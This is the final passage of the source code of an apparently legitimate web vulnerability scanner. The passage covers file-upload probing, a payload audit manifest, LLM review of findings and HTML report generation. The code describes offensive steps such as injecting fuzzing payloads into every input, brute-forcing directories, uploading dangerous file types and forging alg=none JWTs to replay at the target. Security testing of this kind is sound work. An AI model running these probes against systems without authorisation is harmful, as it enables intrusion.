                        "findings_count": len(jwt_findings),
                        "is_authenticated": is_authenticated,
                    }, indent=2),
                    encoding="utf-8",
                )
            except Exception:
                pass
            completed_phases.append("jwt_analysis")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface,
                            passive=passive,
                            findings=findings,
                            login_succeeded=login_succeeded)

        # --- Step 9.8: File Upload Testing (if --test-file-upload) ----------
        # Browser-driven probes against every <input type=file> found in the
        # attack surface. Emits A05 findings for accepted dangerous uploads
        # and writes file_uploads.json (full attempt table + landing URLs)
        # for the Uploads tab. Gated by CLI flag (not completed_phases) like
        # access-control / deep-logic. Reuses the fresh post-active page.
        if args.test_file_upload and not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting file-upload testing")
            GLOBAL_STATE.current_phase = "file_upload"
            fu_tester = FileUploadTester(
                rate_limiter=rate_limiter,
                logger=logger,
                evidence_dir=evidence_dir,
                base_filename=args.upload_base_filename,
                output_dir=output_dir,
            )
            try:
                upload_findings = await fu_tester.test(
                    page=page,
                    attack_surface=attack_surface,
                    target_url=args.url,
                )
            except Exception as e:
                logger.log("phase",
                           f"file-upload testing failed: {type(e).__name__}: {e}")
                upload_findings = []
            if upload_findings:
                findings.extend(upload_findings)
                if findings is not GLOBAL_STATE.partial_findings:
                    GLOBAL_STATE.partial_findings.extend(upload_findings)
            logger.log("phase",
                       f"file-upload testing complete: "
                       f"{len(upload_findings)} accepted-dangerous findings")

        # --- Step 10: Evidence — after screenshot ---
        if not GLOBAL_STATE.stop_event.is_set():
            await evidence_engine.capture_after(page, "after")

        # --- Step 10.1: Save findings.json ---
        # Serialize all findings to a standalone JSON file so the web UI
        # can serve them via the /api/scans/[id]/findings endpoint (used
        # by the interactive OWASP tab).
        if not GLOBAL_STATE.stop_event.is_set():
            findings_data = []
            for f in _dedupe_findings_by_id(findings):
                d = asdict(f)
                # Convert absolute screenshot path to just the filename
                # (the web UI constructs the evidence URL itself).
                if d.get("screenshot_path"):
                    d["screenshot_path"] = os.path.basename(d["screenshot_path"])
                    d["has_screenshot"] = True
                else:
                    d["has_screenshot"] = False
                findings_data.append(d)
            findings_json_path = output_dir / "findings.json"
            findings_json_path.write_text(
                json.dumps(findings_data, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("findings_saved",
                       f"path={findings_json_path.name} count={len(findings_data)}")

            # --- Step 10.2: Payload manifest (audit trail) -----------------
            # Records EXACTLY what the scanner sent to the target — the full
            # payload list, the directory wordlist, the file-upload probes
            # (if run), the JWT alg=none forge flag, and auth flags — so the
            # pentester can disclose it in their client report / prove scope.
            # This is on-disk only; it is not sent anywhere.
            try:
                # JWT flags: the jwt_tokens var is block-scoped above, so read
                # the audit record that the jwt_analysis phase wrote.
                jwt_ran = (output_dir / "jwt_analysis.json").exists()
                jwt_tokens_found = False
                if jwt_ran:
                    try:
                        _ja = json.loads((output_dir / "jwt_analysis.json").read_text(encoding="utf-8"))
                        jwt_tokens_found = int(_ja.get("tokens_analyzed", 0)) > 0
                    except Exception:
                        pass
                # Directory wordlist (file order; the SET sent is what matters
                # for "what was sent" — LLM reorder only changes request order).
                _wl, _wl_path = _load_wordlist(
                    Path(args.wordlist) if getattr(args, "wordlist", None) else None, logger)
                # LLM-discovered path probes (content-driven discovery). If the
                # in-memory list is empty (e.g. this is a resumed run where the
                # phase already completed), recover them from directory_findings.
                _lld = list(llm_discovered_probes)
                if not _lld:
                    try:
                        _dirrows_m = json.loads(
                            (output_dir / "directory_findings.json").read_text(encoding="utf-8"))
                        _lld = [{"path": d.get("path"), "status": d.get("status"),
                                 "found_via": "AI content analysis (comments/JS/text)"}
                                for d in _dirrows_m
                                if isinstance(d, dict) and d.get("base") == "(llm-discovered)"]
                    except Exception:
                        pass
                manifest = {
                    "scan_id": output_dir.name,
                    "target_url": args.url,
                    "generated_at": datetime.now(timezone.utc).isoformat(),
                    "fuzzing_payloads": {
                        "source": str(payloads_path) if payloads_path else str(Path(__file__).parent / "payloads.txt"),
                        "count": len(payloads),
                        "items": list(payloads),
                        "note": "Each payload is injected into every discovered input (form fields, URL params, fetch bodies). Items include any LLM-planner-appended custom payloads.",
                    },
                    "directory_wordlist": {
                        "source": str(_wl_path),
                        "count": len(_wl),
                        "items": list(_wl),
                        "note": "Prefix-aware: each path is requested against the root AND every discovered path prefix. Order shown is file order; if the LLM reordered, request order differed but the SET sent is identical.",
                        "llm_discovered_additions": _lld,
                    },
                    "file_upload_probes": {
                        "ran": bool(getattr(args, "test_file_upload", False)),
                        "note": "Only fires if --test-file-upload is set AND a <input type=file> is discovered. Uploaded files carry a harmless WR-UPLOAD-OK marker (not real webshells).",
                        "probes": [
                            {
                                "id": pid, "filename": f"<upload-base>{ext}",
                                "declared_mime": mime, "content": content.decode("utf-8", errors="replace"),
                                "severity_if_accepted": sev, "rationale": rationale,
                            }
                            for (pid, ext, mime, content, sev, _owasp, rationale) in FILE_UPLOAD_PROBES
                        ] if getattr(args, "test_file_upload", False) else [],
                    },
                    "jwt_alg_none_forge": {
                        "ran": jwt_ran and bool(is_authenticated) and jwt_tokens_found,
                        "tokens_found": jwt_tokens_found,
                        "note": "Only if the scan is authenticated AND JWT tokens were found. Re-signs the target's own token with alg=none + empty signature and replays it at the target.",
                    },
                    "attack_surface": {
                        "inputs_discovered": len(attack_surface),
                    },
                    "authentication": {
                        "login_performed": bool(is_authenticated),
                        "custom_headers_used": bool(getattr(args, "custom_headers", "")),
                    },
                    "data_flow_note": "This manifest lists everything sent to the target. Nothing was sent to any third party; the only other egress is the user-configured LLM endpoint, used solely by opt-in AI features. Additionally, read-only GET requests were made to public CDN/external script and stylesheet hosts referenced by the target's pages (see third_party_fetches — no scan data is sent, only file downloads). If the LLM endpoint is localhost, the only traffic leaving the machine is to this target and those public hosts.",
                    "third_party_fetches": {
                        "external_js_fetched": external_js_fetched,
                        "external_css_fetched": external_css_fetched,
                        "note": "Public CDN scripts/stylesheets referenced by the target's pages, downloaded for version fingerprinting + AI analysis. GET requests only; no scan data transmitted.",
                    },
                }
                manifest_path = output_dir / "payload_manifest.json"
                manifest_path.write_text(
                    json.dumps(manifest, indent=2, ensure_ascii=False, default=str),
                    encoding="utf-8",
                )
                logger.log("payload_manifest_saved", f"path={manifest_path.name}")
            except Exception as e:
                logger.log("payload_manifest", f"failed to write manifest: {e}")

        # --- Step 10.5: LLM vulnerability analysis (if --llm-analyze) ---
        # After active scanning, the LLM reviews the findings + raw
        # responses to detect vulnerabilities the regex missed, classify
        # findings into OWASP categories, and identify false positives.
        # The analysis is saved to llm_analysis.json for the UI.
        llm_analysis: Optional[Dict[str, Any]] = None
        if args.llm_analyze and not GLOBAL_STATE.stop_event.is_set():
            # DEDUPE findings before LLM analysis — the raw `findings` list
            # may contain duplicates (from restarts/resumes). Without dedup,
            # the LLM analyzes the same finding N times, wasting LLM calls
            # and making the phase take N× longer than needed.
            deduped = _dedupe_findings_by_id(findings)
            if len(deduped) < len(findings):
                logger.log("phase",
                           f"deduped {len(findings)} → {len(deduped)} findings "
                           f"before LLM analysis ({len(findings) - len(deduped)} duplicates removed)")
                findings = deduped
            logger.log("phase", f"starting LLM vulnerability analysis ({len(findings)} findings)")
            GLOBAL_STATE.current_phase = "llm_analysis"
            analyzer = LLMAnalyzer(llm_adapter, logger)
            llm_analysis = await analyzer.analyze(
                target_url=args.url,
                findings=findings,
                passive_findings=passive,
                ssl_record=ssl_record,
                crawl_map=crawl_map,
                attack_surface=attack_surface,
            )
            analysis_path = output_dir / "llm_analysis.json"
            analysis_path.write_text(
                json.dumps(llm_analysis, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("llm_analysis_saved", f"path={analysis_path.name}")
            if llm_analysis.get("llm_error"):
                logger.log("llm_analysis_warning",
                           f"LLM analyzer error: {llm_analysis['llm_error']}")

    except Exception as e:
        # Top-level error handler. We log the error and continue to
        # render a partial report with whatever evidence was collected.
        logger.log("scan_error", f"{type(e).__name__}: {e}")
        findings = GLOBAL_STATE.partial_findings
        crawl_map = GLOBAL_STATE.partial_crawl_map
        attack_surface = GLOBAL_STATE.partial_attack_surface
        header_records = GLOBAL_STATE.partial_headers
        ssl_record = GLOBAL_STATE.partial_ssl or SSLRecord(
            hostname=urlparse(args.url).hostname or "",
            port=urlparse(args.url).port or 443,
        )
        passive = PassiveFindings()
    finally:
        # --- Step 13: Cleanup ---
        # Forcefully close the browser. If we don't, Chromium processes
        # can leak in the system's process table — especially on Ctrl+C.
        if browser is not None:
            try:
                await browser.close()
            except Exception:
                pass
        if GLOBAL_STATE.playwright_ctx is not None:
            try:
                await GLOBAL_STATE.playwright_ctx.stop()
            except Exception:
                pass

    # --- Step 11: LLM executive summary ---
    scan_ended_at = datetime.now(timezone.utc)
    # Build the digest for the LLM. We prioritise high-severity findings.
    sev_order = {"High": 0, "Medium": 1, "Low": 2, "Info": 3}
    sorted_findings = sorted(
        findings, key=lambda f: sev_order.get(f.severity, 99),
    )
    digest = {
        "target_url": args.url,
        "total_findings": len(findings),
        "by_severity": {
            "High": sum(1 for f in findings if f.severity == "High"),
            "Medium": sum(1 for f in findings if f.severity == "Medium"),
            "Low": sum(1 for f in findings if f.severity == "Low"),
            "Info": sum(1 for f in findings if f.severity == "Info"),
        },
        "top_findings": [
            {"title": f.title, "severity": f.severity,
             "url": f.url, "owasp_category": f.owasp_category}
            for f in sorted_findings[:10]
        ],
        "ssl_issues": _summarise_ssl_issues(ssl_record),
        "missing_headers": passive.missing_security_headers,
    }
    logger.log("phase", "generating executive summary (LLM or fallback)")
    GLOBAL_STATE.current_phase = "llm_summary"
    executive_summary = await llm_adapter.summarize(digest)

    # --- Step 12: Render HTML report ---
    evidence_files = evidence_engine.list_raw_evidence()
    report_gen = HTMLReportGenerator(
        target_url=args.url,
        scan_started_at=scan_started_at,
        scan_ended_at=scan_ended_at,
        interrupted=GLOBAL_STATE.interrupted,
        scope_config={
            "target_url": args.url,
            "depth": args.depth,
            "scope_patterns": args.scope_patterns,
            "exclude_patterns": args.exclude_patterns,
            "delay_ms": args.delay,
            "concurrency": args.concurrency,
            "ignore_robots": args.ignore_robots,
            "allow_external": args.allow_external,
            # Login state is recorded in scope_config so the report's
            # Scope of Engagement table can show whether the scan was
            # authenticated. This is critical context for the engineer
            # auditing the findings: an unauthenticated scan that found
            # nothing is much less reassuring than an authenticated scan
            # that found nothing.
            "login_url": args.login_url or "(none — unauthenticated scan)",
            "login_user": args.login_user or "(none)",
            # Reflect capture auth too: a capture-only scan (no --login-url)
            # previously showed N/A here even though the captured session
            # authenticated the scan. Show login_succeeded whenever EITHER
            # auth method was configured.
            "login_succeeded": login_succeeded if (args.login_url or args.load_state) else None,
            "auth_method": "captured-session (--load-state)" if (args.load_state and not args.login_url)
                           else ("form-login + captured-session" if (args.load_state and args.login_url)
                                 else ("form-login" if args.login_url else "none (unauthenticated)")),
            # Pointer to the on-disk audit trail of EXACTLY what was sent to
            # the target (payloads, wordlist, file-upload probes, JWT forge,
            # auth flags). The report's Scope-of-Engagement table shows this
            # so the pentester can disclose it in their client report.
            "payload_manifest": "payload_manifest.json",
        },
        header_records=header_records,
        crawl_map=crawl_map,
        attack_surface=attack_surface,
        ssl_record=ssl_record,
        passive=passive,
        findings=_dedupe_findings_by_id(findings),
        evidence_files=evidence_files,
        before_screenshot=evidence_engine.before_screenshot,
        after_screenshot=evidence_engine.after_screenshot,
        executive_summary=executive_summary,
        logger=logger,
        ai_analysis=llm_analysis,
    )
    report_path = output_dir / "report.html"
    report_gen.render(report_path)

    logger.log("scan_complete",
               f"report={report_path.name} findings={len(findings)} "
               f"interrupted={GLOBAL_STATE.interrupted}",
               # Top-level JSON field (logger kwargs) so the Node-side
               # finalizeScan trail parse sees it — previously `interrupted`
               # lived only inside the result STRING, making that parse dead
               # code and letting stopped scans finalize as "completed".
               interrupted=bool(GLOBAL_STATE.interrupted))

    # --- Write a scan_completed.marker file ---
    # This is a SURE-FIRE way for the Node.js side to detect completion.
    # The periodic updater in scanner-runner.ts checks for this file
    # and updates the DB to "completed" — bypassing finalizeScan entirely.
    # This fixes the "stuck at running" bug where finalizeScan fails for
    # various reasons (stale pause_state, race conditions, etc.).
    try:
        import json as _json
        marker_data = {
            "completed_at": datetime.now(timezone.utc).isoformat(),
            "findings_count": len(findings),
            "findings_high": sum(1 for f in findings if f.severity == "High"),
            "findings_medium": sum(1 for f in findings if f.severity == "Medium"),
            "findings_low": sum(1 for f in findings if f.severity == "Low"),
            "interrupted": GLOBAL_STATE.interrupted,
        }
        (output_dir / "scan_completed.marker").write_text(
            _json.dumps(marker_data, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass

    # Final summary to the engineer.
    print()
    print("=" * 60)
    print("SCAN COMPLETE")
    print("=" * 60)
    print(f"  Report:        {report_path}")
    print(f"  Evidence:      {evidence_dir}")
    print(f"  Trail:         {trail_path}")
    print(f"  Findings:      {len(findings)} (ALL UNVERIFIED)")
    print(f"  Interrupted:   {GLOBAL_STATE.interrupted}")
    print()
    print("NEXT STEPS:")
    print("  1. Open the report in a browser (file:// works; no server needed).")
    print("  2. Audit each finding in the OWASP tab using the raw evidence.")
    print("  3. Manually verify every High-severity finding before remediation.")
    print("  4. Review the execution_trail.jsonl for any anomalies the tool")
    print("     may have missed during automated detection.")
    print("=" * 60)

    return EXIT_INTERRUPTED if GLOBAL_STATE.interrupted else EXIT_OK


def _load_payloads(path: Optional[Path], logger: ExecutionTrailLogger) -> List[str]:
    """Load payloads from a file. NO hardcoded fallback.

    If path is None (no --payloads flag), tries bin/payloads.txt.
    If that file is missing or empty, returns an empty list + logs a
    warning. The caller checks for empty list and skips active fuzzing.
    """
    # If no explicit path given, try the default bin/payloads.txt.
    if path is None:
        path = Path(__file__).parent / "payloads.txt"
    if not path.exists():
        logger.log("payloads_warning",
                   f"payloads file not found: {path} — "
                   "active fuzzing will be SKIPPED. Create bin/payloads.txt "
                   "with one payload per line to enable fuzzing.")
        return []
    text = path.read_text(encoding="utf-8", errors="replace")
    payloads = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        payloads.append(line)
    if not payloads:
        logger.log("payloads_warning",
                   f"payloads file is empty: {path} — "
                   "active fuzzing will be SKIPPED.")
    else:
        logger.log("payloads_load",
                   f"loaded {len(payloads)} payloads from {path}")
    return payloads


def _load_wordlist(path: Optional[Path], logger: ExecutionTrailLogger) -> Tuple[List[str], Path]:
    """Load the directory brute-force wordlist. NO hardcoded fallback.

    Returns (entries, resolved_path). If path is None (no --wordlist flag),
    uses bin/wordlist.txt. One path per line; lines starting with '#' and
    blank lines are ignored. Missing/empty file → ([], resolved_path) + a
    warning log; the caller skips brute-forcing on empty.

    Shared between _run_directory_bruteforce and the payload-manifest writer
    so both use identical path-resolution + parsing.
    """
    if path is None:
        path = Path(__file__).parent / "wordlist.txt"
    if not path.exists():
        logger.log("directory_bruteforce_skip",
                   f"wordlist file not found: {path} — "
                   "skipping directory brute-forcing. Create bin/wordlist.txt "
                   "with one path per line to enable this feature.")
        return [], path
    text = path.read_text(encoding="utf-8", errors="replace")
    entries = [line.strip() for line in text.splitlines()
               if line.strip() and not line.strip().startswith("#")]
    if not entries:
        logger.log("directory_bruteforce_skip",
                   f"wordlist file is empty: {path} — "
                   "skipping directory brute-forcing.")
    else:
        logger.log("directory_bruteforce_loaded",
                   f"loaded {len(entries)} paths from {path.name}")
    return entries, path


def _sanitize_llm_payloads(items: List[Any]) -> List[str]:
    """Keep only plausible payload strings from an LLM plan's custom_payloads.

    LLMs sometimes echo the input digest back as objects (or as dict-repr
    strings like "{'name': 'q', ...}") — those would be injected as literal
    text into every input, wasting fuzz cycles and polluting the payload
    manifest. Drop non-strings, object/array reprs, and oversized items.
    Applied where saved plans merge into the fuzzing list so an old bad plan
    can't poison a scan either.
    """
    out: List[str] = []
    for p in items:
        if not isinstance(p, str):
            continue
        ps = p.strip()
        if not ps or len(ps) > 500:
            continue
        if (ps.startswith("{") and ps.endswith("}")) or \
           (ps.startswith("[") and ps.endswith("]")):
            continue  # object/array repr — not a payload
        out.append(ps)
    return out


def _write_crawl_map(output_dir: Path, crawl_map: List["CrawledURL"],
                     logger: "ExecutionTrailLogger") -> None:
    """Persist the (possibly augmented) crawl map to crawl_map.json.

    The file is originally written once during the initial crawl. Later
    phases append to the in-memory list (dir-brute re-crawl pages + their
    links; LLM-discovered 200s) — without this rewrite, the Sitemap tab
    (which reads the file from disk) never sees those additions.
    """
    try:
        (output_dir / "crawl_map.json").write_text(
            json.dumps([asdict(c) for c in crawl_map], indent=2,
                       ensure_ascii=False, default=str),
            encoding="utf-8",
        )
    except Exception as e:
        logger.log("crawl_map_save", f"failed to rewrite crawl_map.json: {e}")


def _summarise_ssl_issues(record: SSLRecord) -> List[str]:
    """Build a list of human-readable SSL issue strings for the LLM digest."""
    issues = []
    if record.is_expired:
        issues.append("Certificate is expired")
    elif record.days_until_expiry is not None and record.days_until_expiry < 30:
        issues.append(f"Certificate expires in {record.days_until_expiry} days")
    if record.is_self_signed:
        issues.append("Certificate is self-signed")
    if record.is_untrusted_root:
        issues.append("Certificate chain has untrusted root")
    if record.hostname_mismatch:
        issues.append("Certificate hostname mismatch")
    for c in record.weak_ciphers_detected:
        issues.append(f"Weak cipher: {c}")
    for p in record.weak_protocols_detected:
        issues.append(f"Weak protocol: {p}")
    return issues


# ============================================================================
# SECTION 18 — ENTRY POINT
# ============================================================================

def _load_json_file(p: Path, default: Any) -> Any:
    """Read+parse a JSON file, returning `default` on any failure."""
    try:
        return json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        return default


def render_report_only(args: argparse.Namespace) -> int:
    """Regenerate the full HTML report from the JSON files on disk.

    No browser, no network, no LLM, no phases. Loads whatever data the scan
    managed to persist (scan_state.json + the standalone *.json files) and
    renders it via HTMLReportGenerator. Missing files degrade gracefully to
    empty sections rather than crashing.
    """
    output_dir = Path(args.output)
    if not output_dir.exists():
        print(f"[FATAL] --report-only: output dir not found: {output_dir}",
              file=sys.stderr)
        return EXIT_CONFIG_ERROR

    # Minimal logger → stdout + execution_trail.jsonl (append).
    trail_path = output_dir / "execution_trail.jsonl"
    logger = ExecutionTrailLogger(trail_path)

    state = _load_json_file(output_dir / "scan_state.json", {}) or {}

    # --- Findings (prefer scan_state, fall back to findings.json) ---
    findings: List[Finding] = []
    f_dicts = state.get("findings")
    if not isinstance(f_dicts, list):
        f_dicts = _load_json_file(output_dir / "findings.json", []) or []
    for fd in f_dicts:
        rebuilt = _dataclass_from_dict(Finding, fd)
        if rebuilt is not None:
            findings.append(rebuilt)
    findings = _dedupe_findings_by_id(findings)

    # --- SSL / passive / crawl_map / attack_surface / headers ---
    ssl_record = _dataclass_from_dict(SSLRecord, state.get("ssl_record"))
    if ssl_record is None:
        ssl_record = _dataclass_from_dict(
            SSLRecord, _load_json_file(output_dir / "ssl_record.json", {}))
    if ssl_record is None:
        host = (urlparse(args.url).hostname or "")
        port = urlparse(args.url).port or (443 if args.url.startswith("https") else 80)
        ssl_record = SSLRecord(hostname=host, port=port)

    passive = _dataclass_from_dict(PassiveFindings, state.get("passive"))
    if passive is None:
        passive = _dataclass_from_dict(
            PassiveFindings, _load_json_file(output_dir / "passive_findings.json", {}))
    if passive is None:
        passive = PassiveFindings()

    def _load_list(klass, src_dicts, fallback_path):
        if isinstance(src_dicts, list) and src_dicts:
            return [r for r in (_dataclass_from_dict(klass, d) for d in src_dicts) if r is not None]
        fb = _load_json_file(output_dir / fallback_path, []) or []
        return [r for r in (_dataclass_from_dict(klass, d) for d in fb) if r is not None]

    header_records = _load_list(HeaderRecord, state.get("header_records"), "headers_comparison.json")
    crawl_map = _load_list(CrawledURL, state.get("crawl_map"), "crawl_map.json")
    attack_surface = _load_list(InputField, state.get("attack_surface"), "attack_surface.json")

    # --- Evidence files + screenshots ---
    evidence_dir = output_dir / "evidence"
    evidence_files: List[Dict[str, Any]] = []
    if evidence_dir.exists():
        for p in sorted(evidence_dir.iterdir()):
            try:
                st = p.stat()
                evidence_files.append({
                    "name": p.name, "sizeBytes": st.st_size,
                    "modified": datetime.fromtimestamp(st.st_mtime, tz=timezone.utc).isoformat(),
                })
            except Exception:
                pass

    def _find_shot(label: str) -> Optional[Path]:
        cand = evidence_dir / f"screenshot_{label}.png"
        return cand if cand.exists() else None

    before_shot = _find_shot("before")
    after_shot = _find_shot("after")

    # --- Timing ---
    scan_started_at = state.get("_scan_started_at")
    scan_ended_at = datetime.now(timezone.utc)
    if not isinstance(scan_started_at, datetime):
        try:
            scan_started_at = datetime.fromisoformat(state.get("_scan_started_at"))
        except Exception:
            try:
                scan_started_at = datetime.fromtimestamp(
                    (output_dir / "scan_args.json").stat().st_mtime, tz=timezone.utc)
            except Exception:
                scan_started_at = scan_ended_at

    login_succeeded = state.get("login_succeeded")
    # --- Build scope_config from args (force-complete passes the originals) ---
    scope_config = {
        "target_url": args.url,
        "depth": getattr(args, "depth", 3),
        "scope_patterns": getattr(args, "scope_patterns", []),
        "exclude_patterns": getattr(args, "exclude_patterns", []),
        "delay_ms": getattr(args, "delay", 500),
        "concurrency": getattr(args, "concurrency", 1),
        "ignore_robots": getattr(args, "ignore_robots", False),
        "allow_external": getattr(args, "allow_external", False),
        "login_url": getattr(args, "login_url", None) or "(none — unauthenticated scan)",
        "login_user": getattr(args, "login_user", None) or "(none)",
        "login_succeeded": login_succeeded if getattr(args, "login_url", None) else None,
    }

    executive_summary = (
        "This report was regenerated from on-disk scan data (e.g. after a "
        "force-complete). All captured findings, headers, SSL, passive, and "
        "inventory data are shown. Any phase that did not complete before the "
        "scan was stopped will simply be absent — this is expected for a "
        "partial/force-completed scan."
    )

    logger.log("report_only_start",
               f"findings={len(findings)} headers={len(header_records)} "
               f"crawl={len(crawl_map)} passive_errors={len(passive.error_messages)}")

    # Load LLM analysis (if --llm-analyze ran) for per-finding AI annotations.
    llm_analysis_data = _load_json_file(output_dir / "llm_analysis.json", None)
    if not isinstance(llm_analysis_data, dict):
        llm_analysis_data = None

    report_gen = HTMLReportGenerator(
        target_url=args.url,
        scan_started_at=scan_started_at,
        scan_ended_at=scan_ended_at,
        interrupted=True,  # report-only implies the scan didn't finish normally
        scope_config=scope_config,
        header_records=header_records,
        crawl_map=crawl_map,
        attack_surface=attack_surface,
        ssl_record=ssl_record,
        passive=passive,
        findings=findings,
        evidence_files=evidence_files,
        before_screenshot=before_shot,
        after_screenshot=after_shot,
        executive_summary=executive_summary,
        logger=logger,
        ai_analysis=llm_analysis_data,
    )
    report_path = output_dir / "report.html"
    report_gen.render(report_path)
    logger.log("report_only_done",
               f"path={report_path.name} size={report_path.stat().st_size}B")
    return EXIT_OK


def main() -> int:
    """Synchronous entry point. Parses args and runs the async scan."""
    args = parse_args()
    # --report-only: regenerate the full HTML report from the JSON files
    # already on disk. No browser, no network, no phases, no LLM. Used by
    # the web UI's force-complete action so a force-completed scan gets the
    # FULL styled report (tabs/evidence/OWASP) instead of the minimal
    # table the route used to write inline.
    if getattr(args, "report_only", False):
        return render_report_only(args)
    try:
        return asyncio.run(run_scan(args))
    except KeyboardInterrupt:
        # asyncio.run() may raise KeyboardInterrupt if the signal handler
        # didn't catch it cleanly. Treat as interrupted.
        print("\n[!] Interrupted.", file=sys.stderr)
        return EXIT_INTERRUPTED
    except Exception as e:
        print(f"\n[FATAL] {type(e).__name__}: {e}", file=sys.stderr)
        return EXIT_RUNTIME_ERROR


if __name__ == "__main__":
    sys.exit(main())


# ============================================================================
# END OF FILE
# ============================================================================
